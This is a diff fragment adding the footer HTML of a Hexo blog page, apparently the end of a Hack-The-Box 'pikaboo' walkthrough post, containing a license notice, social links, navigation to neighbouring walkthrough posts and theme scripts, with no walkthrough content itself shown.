+      <a href="https://fdlucifer.github.io/2021/07/20/pikaboo/" title="Hack-The-Box-walkthrough[pikaboo]">https://fdlucifer.github.io/2021/07/20/pikaboo/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/07/12/seal/" rel="prev" title="Hack-The-Box-walkthrough[seal]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[seal]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/07/26/bountyhunter/" rel="next" title="Hack-The-Box-walkthrough[bountyhunter]">
+                  Hack-The-Box-walkthrough[bountyhunter] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
